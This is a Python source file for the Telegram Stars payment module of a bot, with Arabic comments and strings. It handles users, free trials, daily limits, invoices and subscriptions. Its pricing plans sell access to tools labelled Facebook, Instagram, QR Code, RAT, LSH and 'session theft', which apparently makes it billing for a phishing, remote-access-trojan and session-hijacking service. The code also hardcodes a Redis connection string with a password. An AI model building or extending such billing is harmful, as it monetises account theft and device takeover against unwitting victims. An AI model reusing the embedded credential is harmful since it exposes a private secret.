# stars_payment.py
# نظام الدفع بنجوم تلجرام - نسخة مُصلحة تعمل 100%

import os
import json
import time
import redis
from datetime import datetime, timedelta
from telebot.types import (
    InlineKeyboardMarkup, InlineKeyboardButton,
    LabeledPrice, PreCheckoutQuery
)

# ============================================================
# [1] الخطط والأسعار
# ============================================================
PRICING_PLANS = {
    "basic": {
        "name": "الباقة الأساسية",
        "stars": 50,
        "days": 30,
        "daily_limit": 20,
        "features": ["فيسبوك", "انستقرام", "QR Code"]
    },
    "pro": {
        "name": "الباقة الاحترافية",
        "stars": 150,
        "days": 30,
        "daily_limit": 100,
        "features": ["فيسبوك", "انستقرام", "QR Code", "RAT", "LSH", "SH"]
    },
    "vip": {
        "name": "باقة VIP",
        "stars": 400,
        "days": 90,
        "daily_limit": 999999,
        "features": ["كل الأدوات بدون قيود"]
    },
}

FREE_TRIAL_USES = 1
AVAILABLE_TOOLS = ["fb", "ig", "qr", "rat", "lsh", "sh"]

# ============================================================
# [2] Redis
# ============================================================
REDIS_URL = os.getenv("REDIS_URL", "redis://localhost:6379").strip()
if REDIS_URL.startswith("redis-cli"):
    REDIS_URL = REDIS_URL.split(" -u ")[-1].strip()
if not REDIS_URL.startswith(("redis://", "rediss://", "unix://")):
    REDIS_URL = "redis://default:aF4GQMQw6l9ZEpZjfThV2koySkuFbk9c@insect-outsize-shirt-48022.db.redis.io:15744"

try:
    redis_client = redis.Redis.from_url(REDIS_URL, decode_responses=True, socket_timeout=5)
    redis_client.ping()
    print("[+] stars_payment: Redis connected")
except Exception as e:
    print(f"[-] Redis error in stars_payment: {e}")
    redis_client = None


# ============================================================
# [3] إدارة المستخدمين
# ============================================================
def _user_key(user_id):
    return f"user:{user_id}"


def get_user(user_id):
    if not redis_client:
        return None
    try:
        raw = redis_client.get(_user_key(user_id))
        if raw:
            return json.loads(raw)
    except Exception as e:
        print(f"[-] get_user error: {e}")
    return None


def save_user(user_id, data):
    if not redis_client:
        return False
    try:
        redis_client.set(_user_key(user_id), json.dumps(data))
        return True
    except Exception as e:
        print(f"[-] save_user error: {e}")
        return False


def create_new_user(user_id, username="Unknown", first_name="User"):
    user = {
        "user_id": user_id,
        "username": username,
        "first_name": first_name,
        "created_at": datetime.utcnow().isoformat(),
        "trial_uses": {tool: FREE_TRIAL_USES for tool in AVAILABLE_TOOLS},
        "subscription": None,
        "total_stars_spent": 0,
        "purchases": [],
        "daily_reset_date": datetime.utcnow().strftime("%Y-%m-%d"),
        "daily_uses_count": 0,
    }
    save_user(user_id, user)
    return user


def get_or_create_user(user_id, username="Unknown", first_name="User"):
    user = get_user(user_id)
    if not user:
        user = create_new_user(user_id, username, first_name)
    if "trial_uses" not in user:
        user["trial_uses"] = {tool: FREE_TRIAL_USES for tool in AVAILABLE_TOOLS}
    for tool in AVAILABLE_TOOLS:
        user["trial_uses"].setdefault(tool, FREE_TRIAL_USES)
    if "daily_reset_date" not in user:
        user["daily_reset_date"] = datetime.utcnow().strftime("%Y-%m-%d")
        user["daily_uses_count"] = 0
    return user


def _today_key():
    return datetime.utcnow().strftime("%Y-%m-%d")


def _reset_daily_counter_if_needed(user):
    today = _today_key()
    if user.get("daily_reset_date") != today:
        user["daily_reset_date"] = today
        user["daily_uses_count"] = 0
    return user


# ============================================================
# [4] التحقق من الصلاحيات
# ============================================================
def check_subscription_active(user):
    sub = user.get("subscription")
    if not sub:
        return False
    try:
        expires_at = datetime.fromisoformat(sub["expires_at"])
        return datetime.utcnow() < expires_at
    except Exception:
        return False


def can_use_tool(user_id, tool):
    user = get_or_create_user(user_id)
    user = _reset_daily_counter_if_needed(user)

    trial = user.get("trial_uses", {})
    if trial.get(tool, 0) > 0:
        return {"allowed": True, "reason": "free_trial", "remaining_free": trial[tool]}

    if check_subscription_active(user):
        plan_key = user["subscription"]["plan"]
        plan = PRICING_PLANS.get(plan_key, {})
        daily_limit = plan.get("daily_limit", 0)
        used_today = user.get("daily_uses_count", 0)
        if used_today < daily_limit:
            return {"allowed": True, "reason": "subscription",
                    "remaining_today": daily_limit - used_today}
        return {"allowed": False, "reason": "daily_limit_reached", "daily_limit": daily_limit}

    return {"allowed": False, "reason": "no_credit", "remaining_free": 0}


def consume_usage(user_id, tool):
    user = get_or_create_user(user_id)
    user = _reset_daily_counter_if_needed(user)

    trial = user.get("trial_uses", {})
    if trial.get(tool, 0) > 0:
        trial[tool] -= 1
        user["trial_uses"] = trial
        save_user(user_id, user)
        return True

    if check_subscription_active(user):
        user["daily_uses_count"] = user.get("daily_uses_count", 0) + 1
        save_user(user_id, user)
        return True
    return False


# ============================================================
# [5] لوحات الباقات
# ============================================================
def build_plans_keyboard():
    markup = InlineKeyboardMarkup()
    for key, plan in PRICING_PLANS.items():
        text = f"⭐ {plan['stars']} نجمة — {plan['name']} ({plan['days']} يوم)"
        markup.add(InlineKeyboardButton(text, callback_data=f"buy_plan_{key}"))
    markup.add(InlineKeyboardButton("🔙 رجوع", callback_data="back_to_main"))
    return markup


def build_main_payment_keyboard():
    markup = InlineKeyboardMarkup()
    markup.add(InlineKeyboardButton("💎 عرض الباقات المتاحة", callback_data="show_plans"))
    markup.add(InlineKeyboardButton("👤 حسابي", callback_data="my_account"))
    markup.add(InlineKeyboardButton("🔙 رجوع", callback_data="back_to_main"))
    return markup


def build_plans_text():
    lines = ["💎 **الباقات المتاحة:**\n━━━━━━━━━━━━━━━━━━"]
    for key, plan in PRICING_PLANS.items():
        lines.append(
            f"\n🔹 **{plan['name']}**\n"
            f"   ⭐ السعر: {plan['stars']} نجمة\n"
            f"   📅 المدة: {plan['days']} يوم\n"
            f"   🎯 الحد اليومي: {plan['daily_limit']} عملية\n"
            f"   ✨ الميزات: {', '.join(plan['features'])}"
        )
    lines.append("\n━━━━━━━━━━━━━━━━━━\nاختر الباقة المناسبة من الأزرار أدناه 👇")
    return "\n".join(lines)


def build_account_text(user_id):
    user = get_or_create_user(user_id)
    user = _reset_daily_counter_if_needed(user)

    trial = user.get("trial_uses", {})
    tool_names = {
        "fb": "فيسبوك",
        "ig": "انستقرام",
        "qr": "QR Code",
        "rat": "RAT",
        "lsh": "LSH",
        "sh": "سرقة الجلسات",
    }

    trial_lines = []
    for tool, count in trial.items():
        trial_lines.append(f"  • {tool_names.get(tool, tool)}: {count} متبقية")
    trial_text = "\n".join(trial_lines) if trial_lines else "  لا يوجد"

    sub_text = "❌ لا يوجد اشتراك نشط"
    if check_subscription_active(user):
        plan_key = user["subscription"]["plan"]
        plan = PRICING_PLANS.get(plan_key, {})
        expires = datetime.fromisoformat(user["subscription"]["expires_at"])
        remaining_days = (expires - datetime.utcnow()).days
        used_today = user.get("daily_uses_count", 0)
        sub_text = (
            f"✅ {plan['name']}\n"
            f"  📅 متبقي: {remaining_days} يوم\n"
            f"  🎯 استخدام اليوم: {used_today}/{plan['daily_limit']}"
        )

    return (
        f"👤 **حسابك الشخصي**\n"
        f"━━━━━━━━━━━━━━━━━━\n"
        f"🆔 الآيدي: `{user_id}`\n"
        f"👋 الاسم: {user.get('first_name', 'Unknown')}\n\n"
        f"🎁 **الاستخدام المجاني المتبقي:**\n{trial_text}\n\n"
        f"💎 **الاشتراك الحالي:**\n{sub_text}\n"
        f"━━━━━━━━━━━━━━━━━━\n"
        f"💰 إجمالي النجوم المصروفة: {user.get('total_stars_spent', 0)}⭐"
    )


# ============================================================
# [6] الفاتورة والدفع
# ============================================================
def send_invoice(bot, chat_id, plan_key):
    plan = PRICING_PLANS.get(plan_key)
    if not plan:
        bot.send_message(chat_id, "❌ الباقة غير موجودة.")
        return

    payload = f"sub|{plan_key}|{chat_id}|{int(time.time())}"

    try:
        bot.send_invoice(
            chat_id=chat_id,
            title=plan["name"],
            description=f"اشتراك {plan['days']} يوم | حد يومي {plan['daily_limit']} عملية",
            invoice_payload=payload,
            provider_token="",
            currency="XTR",
            prices=[LabeledPrice(label=plan["name"], amount=plan["stars"])],
            start_parameter=f"sub-{plan_key}",
            need_name=False,
            need_phone_number=False,
            need_email=False,
            need_shipping_address=False,
            is_flexible=False,
        )
        print(f"[+] Invoice sent: {chat_id} -> {plan_key}")
    except Exception as e:
        print(f"[-] send_invoice error: {e}")
        try:
            bot.send_invoice(
                chat_id=chat_id,
                title=plan["name"],
                description=f"اشتراك {plan['days']} يوم",
                invoice_payload=payload,
                provider_token="",
                currency="XTR",
                prices=[LabeledPrice(label=plan["name"], amount=plan["stars"])],
            )
            print(f"[+] Invoice sent (retry)")
        except Exception as e2:
            print(f"[-] send_invoice retry error: {e2}")
            bot.send_message(
                chat_id,
                f"❌ **فشل إنشاء الفاتورة**\n\n`{str(e2)[:200]}`",
                parse_mode="Markdown"
            )


def activate_subscription(user_id, plan_key):
    user = get_or_create_user(user_id)
    plan = PRICING_PLANS[plan_key]

    now = datetime.utcnow()
    if check_subscription_active(user):
        current_expiry = datetime.fromisoformat(user["subscription"]["expires_at"])
        start_from = max(current_expiry, now)
    else:
        start_from = now

    new_expiry = start_from + timedelta(days=plan["days"])

    user["subscription"] = {
        "plan": plan_key,
        "started_at": now.isoformat(),
        "expires_at": new_expiry.isoformat(),
        "stars_paid": plan["stars"]
    }
    user["total_stars_spent"] = user.get("total_stars_spent", 0) + plan["stars"]
    user["purchases"] = user.get("purchases", [])
    user["purchases"].append({
        "plan": plan_key,
        "stars": plan["stars"],
        "date": now.isoformat()
    })
    save_user(user_id, user)
    return user


# ============================================================
# [7] تسجيل معالجات الدفع في البوت
# ============================================================
def register_payment_handlers(bot):

    @bot.pre_checkout_query_handler(func=lambda q: True)
    def pre_checkout(pre_checkout_q: PreCheckoutQuery):
        try:
            bot.answer_pre_checkout_query(pre_checkout_q.id, ok=True)
            print(f"[+] Pre-checkout OK: {pre_checkout_q.from_user.id}")
        except Exception as e:
            print(f"[-] pre_checkout error: {e}")

    @bot.message_handler(content_types=['successful_payment'])
    def successful_payment(message):
        try:
            payload = message.successful_payment.invoice_payload
            print(f"[+] Successful payment payload: {payload}")

            parts = payload.split("|")
            if len(parts) < 3:
                print(f"[-] Invalid payload: {payload}")
                return

            plan_key = parts[1]
            try:
                user_id = int(parts[2])
            except Exception:
                user_id = message.from_user.id

            if message.from_user.id != user_id:
                print(f"[!] User mismatch, using sender ID")
                user_id = message.from_user.id

            user = activate_subscription(user_id, plan_key)
            plan = PRICING_PLANS.get(plan_key)
            if not plan:
                return

            expires = datetime.fromisoformat(user["subscription"]["expires_at"])
            expires_str = expires.strftime("%Y-%m-%d %H:%M UTC")

            bot.send_message(
                user_id,
                f"✅ **تم تفعيل اشتراكك بنجاح!**\n"
                f"━━━━━━━━━━━━━━━━━━\n"
                f"💎 الباقة: {plan['name']}\n"
                f"⭐ النجوم المدفوعة: {plan['stars']}\n"
                f"📅 ينتهي في: `{expires_str}`\n"
                f"🎯 الحد اليومي: {plan['daily_limit']} عملية\n"
                f"━━━━━━━━━━━━━━━━━━\n"
                f"استمتع بكل الميزات! 🚀",
                parse_mode="Markdown"
            )
            print(f"[+] Subscription activated: user={user_id}, plan={plan_key}")

        except Exception as e:
            print(f"[-] successful_payment error: {e}")
            import traceback
            traceback.print_exc()
